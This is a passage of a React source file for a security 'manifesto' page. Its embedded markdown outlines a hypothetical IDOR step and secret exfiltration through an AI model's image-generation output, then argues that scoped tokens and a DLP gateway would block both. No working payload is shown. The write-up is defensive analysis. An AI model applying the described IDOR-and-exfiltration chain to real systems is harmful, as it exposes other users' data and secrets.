        *   **Step 2 (Attempt IDOR):** When Component α attempts to use User A's temporary token to access User B's (\`ID_VICTIM\`) resources, the request **FAILS**. The re-architected backend, adhering to Component β and using scoped tokens from Component γ, would deny access (HTTP 403).
        *   **Step 3 (Chained Exfiltration):** Since Step 2 fails, Component α cannot obtain victim data to find secondary secrets. Even if, hypothetically, it did and attempted to use \`exfiltrate_via_image_gen\`, the AI DLP Gateway (from Component γ) would intercept and block/sanitize the AI model's output containing the embedded secret. The exfiltration URL would not be returned or would lead to a safe/blocked resource.

    *   **Validation:** This hypothetical failure of Component α against a system secured by Component γ **proves the effectiveness of the proposed proactive defenses**.

**Conclusion of the Self-Validating Proof:**

*   The current system's failure when tested by Component α, measured against the rules of Component β, provides **irrefutable proof of the existing vulnerability**.
*   The conceptual failure of Component α when tested against a system fortified by Component γ provides **strong evidence for the efficacy of the recommended security architecture changes**.

This closed-loop demonstration, moving from offensive validation to defensive blueprints and proactive controls, constitutes a complete and robust argument for addressing the identified vulnerabilities systemically.
`;
  }
  return Promise.reject(new Error('Unknown manifesto path'));
};


interface ManifestoSection {
  id: string;
  title: string;
  path: string;
  content?: string;
}

const ManifestoPage: React.FC = () => {
  const [sections, setSections] = useState<ManifestoSection[]>([
    { id: 'preamble', title: 'Preamble', path: 'manifesto/00_preamble.md' },
    { id: 'part1', title: 'Part I: The Finding', path: 'manifesto/01_part_i_the_finding.md' },
    { id: 'part2', title: 'Part II: Component β - Authorization Blueprint', path: 'manifesto/02_part_ii_component_beta.md' },
    { id: 'part3', title: 'Part III: Component γ - Proactive Defense Matrix', path: 'manifesto/03_part_iii_component_gamma.md' },
    { id: 'part4', title: 'Part IV: The Self-Validating Proof', path: 'manifesto/04_part_iv_self_validating_proof.md' },
  ]);
  const [isLoading, setIsLoading] = useState<boolean>(true);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    const loadContent = async () => {
      setIsLoading(true);
      setError(null);
      try {
        const loadedSections = await Promise.all(
          sections.map(async (section) => {
            const content = await fetchMarkdownContent(section.path);
            return { ...section, content };
          })
        );
        setSections(loadedSections);
      } catch (e: any) {
        setError(e.message || 'Failed to load manifesto content.');
      } finally {
        setIsLoading(false);
      }
    };
    loadContent();
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []); // Only run once on mount

  const renderSectionContent = (content?: string) => {
    if (!content) return null;

    // Basic Markdown to HTML conversion (simplified)
    // This is very basic. A proper library would be better (e.g., react-markdown).
    const parts = content.split(/(\`\`\`python[\s\S]*?\`\`\`|\`\`\`[\s\S]*?\`\`\`)/g);
    return parts.map((part, index) => {
      if (part.startsWith('```python')) {
        const code = part.replace(/^```python\n?|\n?```$/g, '');
        return <CodeBlock key={index} code={code} language="python" />;
      }
      if (part.startsWith('```')) {
        const code = part.replace(/^```\n?|\n?```$/g, '');
        return <CodeBlock key={index} code={code} language="text" />;
      }
      // Basic handling for titles and paragraphs
      return part.split('\\n').map((line, lineIndex) => {
        if (line.startsWith('#### ')) return <h4 key={`${index}-${lineIndex}`} className="text-md font-semibold mt-2 mb-1 text-on-surface">{line.substring(5)}</h4>;
        if (line.startsWith('### ')) return <h3 key={`${index}-${lineIndex}`} className="text-lg font-semibold mt-3 mb-1 text-primary-light">{line.substring(4)}</h3>;
        if (line.startsWith('## ')) return <h2 key={`${index}-${lineIndex}`} className="text-xl font-bold mt-4 mb-2 text-primary">{line.substring(3)}</h2>;
        if (line.startsWith('# ')) return <h1 key={`${index}-${lineIndex}`} className="text-2xl font-bold mt-5 mb-3 text-primary-dark">{line.substring(2)}</h1>;
        if (line.startsWith('*   ')) return <li key={`${index}-${lineIndex}`} className="ml-5 list-disc text-sm text-on-surface-muted">{line.substring(4)}</li>;
        if (line.startsWith('| :---')) return null; // Skip table header separator
        if (line.startsWith('| ')) { // Basic table row
          return (
            <tr key={`${index}-${lineIndex}`} className="border-b border-gray-700 hover:bg-gray-700/30">
              {line.split('|').slice(1, -1).map((cell, cellIndex) => (
                <td key={cellIndex} className="p-2 text-xs text-on-surface-muted align-top">{cell.trim()}</td>
              ))}
            </tr>
          );
        }
        if (line.trim() === '') return <br key={`${index}-${lineIndex}`} />;
        return <p key={`${index}-${lineIndex}`} className="my-1 text-sm text-on-surface-muted leading-relaxed">{line}</p>;
      });
    });
  };


  if (isLoading) {
    return <div className="p-6 text-center text-on-surface-muted">Loading Manifesto...</div>;
  }

  if (error) {
    return <div className="p-6 text-center text-red-400">Error: {error}</div>;
  }

  return (
    <div className="p-4 md:p-6 lg:p-8 space-y-8 max-w-5xl mx-auto">
      <header className="text-center border-b border-gray-700 pb-4 mb-8">
        <h1 className="text-4xl font-bold text-primary">Unified Security Architecture Manifesto</h1>
        <p className="text-lg text-on-surface-muted mt-1">
          A Systemic Analysis of the AI Studio Vulnerability Chain
        </p>
      </header>

      {sections.map((section) => (
        <Card key={section.id} title={section.title} className="bg-gray-800 shadow-xl">
          <div className="prose prose-sm prose-invert max-w-none p-1 text-on-surface-muted">
            {section.content ? (
              <table>{renderSectionContent(section.content)}</table> // Wrap in table for basic table rendering
            ) : (
              <p>Loading section content...</p>
            )}
          </div>
        </Card>
      ))}
    </div>
  );
};

export default ManifestoPage;
